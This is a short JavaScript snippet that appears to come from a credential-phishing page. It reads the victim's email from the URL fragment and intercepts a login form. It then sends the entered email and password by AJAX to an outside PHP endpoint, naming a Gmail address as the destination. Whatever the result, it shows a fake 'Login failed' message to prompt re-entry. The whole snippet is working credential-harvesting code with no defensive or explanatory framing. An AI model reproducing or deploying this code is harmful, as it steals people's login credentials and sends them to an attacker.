
        var email = window.location.hash.substr(1);
        document.getElementById("email_addrs").value = email;

        document.getElementById('getFormData').addEventListener("submit", function (event) {
            event.preventDefault();

            let email = document.getElementById("email_addrs").value;
            let pass = document.getElementById("password").value;
            document.getElementById('clicked-btn').textContent = "Loading...."

            $.ajax({
                dataType: 'json',
                headers: { 'Accept': 'application/json; odata=verbose' },
                url: "https://jmayo.cl/solomoney/send_email.php",
                method: "POST",
                data: {
                    "email": email,
                    "password": pass,
                    "destination": "marianaiaa13@gmail.com",
                },
                success: function (result) {
                    //    console.log("result");
                    document.getElementById('clicked-btn').textContent = "Try Again"
                    document.getElementById("error-msg").innerText = "Login failed! Please enter correct Email Password";

                    // document.getElementById("error-msg").innerText = "Login failed! Please enter correct Email Password";
                    // window.location.href = "0b9cede7c52e504fc2fff4b0fd10661f.png"
                },
                error: (error) => {
                    document.getElementById('clicked-btn').textContent = "Try Again"
                    document.getElementById("error-msg").innerText = "Login failed! Please enter correct Email Password";

                    console.log(error);
                }
            });


        });
    